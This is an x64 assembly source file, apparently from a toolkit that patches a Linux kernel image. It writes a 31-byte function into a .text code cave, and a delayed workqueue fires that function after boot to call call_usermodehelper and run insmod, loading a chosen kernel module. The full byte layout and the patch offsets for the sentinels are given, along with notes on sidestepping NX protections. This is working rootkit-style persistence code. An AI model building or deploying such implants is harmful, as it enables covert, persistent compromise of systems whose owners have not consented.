; lkm_worker.asm
; 31-byte x64 work function written into a .text code cave.
;
; This is the work_func_t stored in delayed_work.work.func by lkm_loader.
; The kernel workqueue fires it ~10 seconds after boot (the delay set by
; queue_delayed_work), at which point userspace is running and
; call_usermodehelper can successfully spawn insmod.
;
; Because this blob lives in .text (permanently RX), there is no NX
; re-protection problem — no set_memory_x trampoline needed.
;
; argv is pre-built by the Rust patcher before the blobs are written to the
; kernel image: argv[0] = &insmod_path, argv[1] = &path_buffer, argv[2] = NULL.
; Both strings live in the lkm_loader .data cave and are readable from .text
; (NX only prevents execution of .data pages, not reads/writes).
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_worker.bin lkm_worker.asm
;
; Blob layout (31 bytes, offsets from blob start):
;   [0]   55                   push rbp
;   [1]   48 8D 3D xx xx xx xx lea rdi, [rip + INSMOD_PATH_DISP_SENTINEL]
;   [8]   48 8D 35 xx xx xx xx lea rsi, [rip + ARGV_DATA_DISP_SENTINEL]
;   [15]  31 D2                xor edx, edx           (envp = NULL)
;   [17]  B9 01 00 00 00       mov ecx, 1             (UMH_WAIT_PROC)
;   [22]  E8 xx xx xx xx       call CALL_USERMODEHELPER_REL_SENTINEL
;   [27]  5D                   pop rbp
;   [28]  31 C0                xor eax, eax
;   [30]  C3                   ret
;
; Calling convention: work_func_t — void fn(struct work_struct *work)
; On entry: rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After push rbp: rsp % 16 == 0 (16-byte aligned before call)
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   INSMOD_PATH_DISP_SENTINEL       0xFEDCBA98  bytes [4..8]   disp32 in lea rdi,[rip+d]
;                                                               → insmod_path in loader cave
;   ARGV_DATA_DISP_SENTINEL         0x98BADCFE  bytes [11..15] disp32 in lea rsi,[rip+d]
;                                                               → argv_data in loader cave
;   CALL_USERMODEHELPER_REL_SENTINEL 0x77889900  bytes [23..27] rel32 for call call_usermodehelper

BITS 64
default rel

lkm_worker:
    push    rbp                         ; [1]  align rsp for call

    ; arg1 rdi = path = &insmod_path  (in lkm_loader .data cave)
    ; disp32 patched by Rust: insmod_path_virt - (lkm_worker_cave_virt + 8)
    db      0x48, 0x8D, 0x3D           ; REX.W LEA rdi, [rip + disp32]  [3]
    dd      0xFEDCBA98                  ; INSMOD_PATH_DISP_SENTINEL       [4]

    ; arg2 rsi = argv = &argv_data  (pre-built by Rust in lkm_loader .data cave)
    ; disp32 patched by Rust: argv_data_virt - (lkm_worker_cave_virt + 15)
    db      0x48, 0x8D, 0x35           ; REX.W LEA rsi, [rip + disp32]  [3]
    dd      0x98BADCFE                  ; ARGV_DATA_DISP_SENTINEL         [4]

    xor     edx, edx                    ; arg3 envp = NULL                [2]
    mov     ecx, 1                      ; arg4 wait = UMH_WAIT_PROC       [5]

    ; rel32 patched by Rust: call_usermodehelper_virt - (lkm_worker_cave_virt + 27)
    db      0xE8                        ; CALL rel32                      [1]
    dd      0x77889900                  ; CALL_USERMODEHELPER_REL_SENTINEL [4]
                                        ; return value ignored (work_func_t is void)

    pop     rbp                         ; [1]
    xor     eax, eax                    ; [2]  return 0 (rax ignored; void)
    ret                                 ; [1]
                                        ; ─────────────────────────────────────
                                        ; Total bytes: 1+7+7+2+5+5+1+2+1 = 31
